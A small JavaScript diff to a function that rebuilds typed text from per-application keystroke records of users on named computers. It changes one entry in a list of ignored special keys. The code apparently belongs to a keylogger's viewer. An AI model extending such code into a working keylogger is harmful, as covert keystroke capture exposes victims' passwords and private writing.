@@ -169,7 +169,7 @@ function fetchUserDetails(computerName, userName) {
 }
 
 function extractFullText(userData) {
-    const ignoredKeys = new Set(["space", "backspace", "ctrl_l", "shift", "shift_r", "tab", "enter", "alt_l", "delete", "esc", "media_next", "media_play_pause", "media_previous", "null", "caps_lock", "alt_gr", "cmd", ""]);
+    const ignoredKeys = new Set(["space", "backspace", "ctrl_l", "shift", "shift_r", "tab", "enter", "alt_l", "delete", "esc", "media_next", "media_play_pause", "media_previous", "null", "caps_lock", "alt_gr", "cmd", "NO keys"]);
     let fullText = "";
 
     for (let app in userData) {
